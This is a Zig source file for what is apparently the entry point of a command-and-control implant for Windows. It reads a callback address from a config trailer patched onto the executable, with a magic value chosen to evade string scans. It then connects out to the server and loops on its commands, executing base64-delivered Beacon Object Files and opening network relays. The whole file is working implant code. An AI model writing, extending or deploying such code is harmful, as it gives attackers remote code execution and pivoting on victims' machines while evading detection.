//! Implant entry point: resolve callback host/port (trailer -> CLI args ->
//! defaults), connect, pump messages until the server closes the stream.
//! Mirrors `crates/implant/src/lib.rs::run`.

const std = @import("std");
const net = @import("net.zig");
const protocol = @import("protocol.zig");
const relay = @import("relay.zig");
const exec = @import("loader/exec.zig");
const beacon = @import("loader/beacon.zig");
const winapi = @import("winapi.zig");

/// Opaque trailer magic (shared with the stub builder). NOT a readable word so
/// it isn't a string-scan telltale. Must match tools/stubbuilder + the Go core
/// stub_patcher.
pub const TRAILER_MAGIC = [_]u8{ 0x7C, 0x53, 0x9A, 0x2E, 0xD1, 0x04, 0xB8, 0x6F, 0x11, 0xA3 };

const DEFAULT_HOST = "127.0.0.1";
const DEFAULT_PORT: u16 = 4444;

pub fn run() !void {
    const alloc = std.heap.smp_allocator;
    beacon.setAllocator(alloc);

    // Callback host/port resolution order:
    //   1. appended-config trailer on the exe (a patched stub)
    //   2. CLI args: implant <host> [port]
    //   3. defaults 127.0.0.1:4444
    var host: []const u8 = DEFAULT_HOST;
    var port: u16 = DEFAULT_PORT;

    if (readTrailerConfig(alloc)) |t| {
        host = t.host;
        port = t.port;
    } else |_| {
        // CLI fallback: parse <host> [port] from the command line (tokens after
        // the exe path). std.process.argsAlloc was removed in 0.16, so we read
        // GetCommandLineA and tokenize (handles double-quoted exe paths). The
        // returned slices point into the stable command-line buffer.
        const args = parseCliArgs();
        if (args.host) |h| host = h;
        if (args.port) |p| port = p;
    }

    // Publish core address for relay splice threads.
    relay.core_addr = .{ .host = host, .port = port };

    const stream = try net.dial(host, port);
    defer stream.close();

    var reader: net.LineReader = .{ .stream = stream };
    defer reader.deinit(alloc);

    while (true) {
        const line = reader.readLine(alloc) catch |e| {
            try sendError(alloc, stream, @errorName(e));
            break;
        };
        const l = line orelse break; // clean close
        if (l.len == 0) continue;

        var parsed = protocol.parseServer(alloc, l) catch |e| {
            var buf: [128]u8 = undefined;
            const msg = std.fmt.bufPrint(&buf, "bad request ({s})", .{@errorName(e)}) catch "bad request";
            try sendError(alloc, stream, msg);
            continue;
        };
        defer parsed.deinit();

        const reply = handle(alloc, parsed.msg) catch |e| blk: {
            var buf: [128]u8 = undefined;
            const m = std.fmt.bufPrint(&buf, "exec: {s}", .{@errorName(e)}) catch "exec failed";
            const dup = alloc.dupe(u8, m) catch "exec failed";
            break :blk protocol.ImplantMessage{ .@"error" = dup };
        };
        defer freeImplant(alloc, reply);

        const json = try protocol.encodeImplant(alloc, reply);
        defer alloc.free(json);
        stream.sendAll(json) catch break;
        stream.sendAll("\n") catch break;
    }
}

fn handle(alloc: std.mem.Allocator, msg: protocol.ServerMessage) !protocol.ImplantMessage {
    switch (msg) {
        .hello => return .{ .hello = "ready" },
        .bof => |b| {
            const coff_bytes = protocol.decodeBase64(alloc, b.file) catch {
                return .{ .@"error" = "decode: bad base64 (file)" };
            };
            defer alloc.free(coff_bytes);
            const args_bytes = protocol.decodeBase64(alloc, b.args) catch &[_]u8{};
            defer if (args_bytes.len > 0) alloc.free(args_bytes);
            const out = exec.runBof(alloc, coff_bytes, args_bytes) catch |e| {
                var buf: [128]u8 = undefined;
                const m = std.fmt.bufPrint(&buf, "exec: {s}", .{@errorName(e)}) catch "exec failed";
                const dup = try alloc.dupe(u8, m);
                return .{ .@"error" = dup };
            };
            return .{ .output = out };
        },
        .relay_listen => |r| {
            return relay.startRelay(alloc, r.relay_id, r.bind_ip, r.port);
        },
        .relay_stop => |r| {
            return relay.stopRelay(alloc, r.relay_id);
        },
    }
}

/// Free any slices the reply owns (output/error/data that we allocated).
fn freeImplant(alloc: std.mem.Allocator, msg: protocol.ImplantMessage) void {
    switch (msg) {
        .hello => {},
        .output => |d| alloc.free(d),
        .@"error" => |d| alloc.free(d),
        .relay_started => |r| {
            // relay_id/bind_ip are borrowed from the parsed server message
            // (already freed by parsed.deinit); port is a value. Nothing owned.
            _ = r;
        },
        .relay_stopped => {},
        .relay_error => |r| {
            if (r.data.len > 0) alloc.free(r.data);
        },
    }
}

fn sendError(alloc: std.mem.Allocator, stream: net.Stream, msg: []const u8) !void {
    const dup = try alloc.dupe(u8, msg);
    defer alloc.free(dup);
    const json = try protocol.encodeImplant(alloc, .{ .@"error" = dup });
    defer alloc.free(json);
    stream.sendAll(json) catch return;
    stream.sendAll("\n") catch return;
}

/// Read the appended-config trailer from this exe. Returns (host, port) on
/// success. Reads only the last 512 bytes (the trailer is short) to avoid
/// scanning the whole binary.
const CliArgs = struct { host: ?[]const u8, port: ?u16 };

/// Parse `<host> [port]` from GetCommandLineA (tokens after the exe path).
/// Returned slices point into the stable command-line buffer.
fn parseCliArgs() CliArgs {
    const cmdline = winapi.commandLine();
    var i: usize = 0;
    var token_idx: usize = 0;
    var result: CliArgs = .{ .host = null, .port = null };
    while (i < cmdline.len) {
        while (i < cmdline.len and (cmdline[i] == ' ' or cmdline[i] == '\t')) i += 1;
        if (i >= cmdline.len) break;
        const quoted = cmdline[i] == '"';
        if (quoted) i += 1;
        const start = i;
        while (i < cmdline.len) : (i += 1) {
            if (quoted) {
                if (cmdline[i] == '"') break;
            } else if (cmdline[i] == ' ' or cmdline[i] == '\t') break;
        }
        const tok = cmdline[start..i];
        if (quoted and i < cmdline.len) i += 1; // skip closing quote
        token_idx += 1;
        if (token_idx == 2) {
            result.host = tok;
        } else if (token_idx == 3) {
            if (std.fmt.parseInt(u16, tok, 10)) |p| result.port = p else |_| {}
            break;
        }
    }
    return result;
}

fn readTrailerConfig(alloc: std.mem.Allocator) !struct { host: []const u8, port: u16 } {
    const tail = winapi.readSelfExeTail(alloc, 512) orelse return error.NoTrailer;
    defer alloc.free(tail);

    const idx = std.mem.indexOf(u8, tail, &TRAILER_MAGIC) orelse return error.NoTrailer;
    const body = tail[idx + TRAILER_MAGIC.len ..];
    const host_end = std.mem.indexOfScalar(u8, body, 0) orelse return error.NoTrailer;
    const host = try alloc.dupe(u8, body[0..host_end]);
    const rest = body[host_end + 1 ..];
    const port_end = std.mem.indexOfScalar(u8, rest, 0) orelse rest.len;
    const port = std.fmt.parseInt(u16, rest[0..port_end], 10) catch return error.NoTrailer;
    if (host.len == 0 or port == 0) return error.NoTrailer;
    return .{ .host = host, .port = port };
}
